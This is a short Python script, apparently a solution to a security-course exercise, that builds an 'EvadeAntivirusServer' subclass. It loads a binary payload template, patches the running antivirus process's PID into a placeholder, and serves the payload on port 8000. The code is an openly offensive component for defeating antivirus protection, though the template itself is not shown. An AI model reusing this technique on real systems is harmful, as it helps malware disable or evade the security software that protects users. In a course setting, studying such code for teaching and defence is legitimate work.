import assemble
import server
import struct

TEMPLATE_PATH = 'q3.template'
TEMPLATE_PID = '\x78\x56\x34\x12'


class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        # convert pid to hex bytes string
        antivirus_pid = struct.pack('<I', pid)
        # open template file and convert to byte array
        f = open(TEMPLATE_PATH)
        payload = bytearray(f.read())
        # search for temporary pid and replace with actual pid
        pid_place = payload.find(TEMPLATE_PID)
        payload[pid_place:pid_place + 4] = antivirus_pid
        f.close()
        return payload

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
